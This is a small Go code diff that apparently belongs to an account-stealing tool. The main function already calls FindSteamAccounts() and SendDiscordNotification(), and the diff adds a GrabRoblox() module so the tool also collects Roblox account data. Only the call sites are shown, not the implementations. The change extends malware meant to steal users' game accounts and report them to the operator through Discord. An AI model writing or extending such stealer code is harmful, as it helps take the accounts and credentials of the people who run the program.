@@ -44,5 +44,8 @@ func main() {
 	if strings.Contains(modulesEnabled, "steam") {
 		_ = FindSteamAccounts()
 	}
+	if strings.Contains(modulesEnabled, "roblox") {
+		GrabRoblox()
+	}
 	_ = SendDiscordNotification()
 }
